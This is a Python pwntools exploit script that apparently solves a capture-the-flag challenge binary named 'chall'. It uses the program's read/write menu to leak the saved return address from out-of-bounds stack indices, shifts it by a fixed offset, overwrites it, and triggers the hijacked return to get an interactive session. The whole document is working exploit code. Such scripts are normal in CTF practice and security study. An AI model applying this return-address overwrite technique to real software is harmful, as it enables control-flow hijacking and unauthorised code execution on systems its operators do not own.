#!/usr/bin/env python3
from pwn import *

def read_int(p, idx):
    p.recvuntil(b': ')
    p.send(b'R\n')
    p.recvuntil(b': ')
    p.send(str(idx).encode() + b'\n')
    return int(p.recvline().decode().strip().replace('Value: ', '')) & 0xFFFFFFFF

def write_int(p, idx, val):
    p.recvuntil(b': ')
    p.send(b'W\n')
    p.recvuntil(b': ')
    p.send(str(idx).encode() + b'\n')
    p.recvuntil(b': ')
    p.send(str(val).encode() + b'\n')
   
def read_ret(p):
    return (read_int(p, 15) << 32) | read_int(p, 14)

def write_ret(p, val):
    p_val = p64(val)
    lo, hi = u32(p_val[:4]), u32(p_val[4:])
    write_int(p, 15, hi)
    write_int(p, 14, lo)

def trigger_quit(p):
    p.recvuntil(b': ')
    p.send(b'Q\n')
    p.interactive()

p = process('./chall')
ret_addr = read_ret(p)
log.info(f'Concluded return address: 0x{ret_addr:02x}')
ret_addr -= 0x1dd
write_ret(p, ret_addr)
log.info(f'Written new return address: 0x{ret_addr:02x}')
log.info('Triggering')
trigger_quit(p)

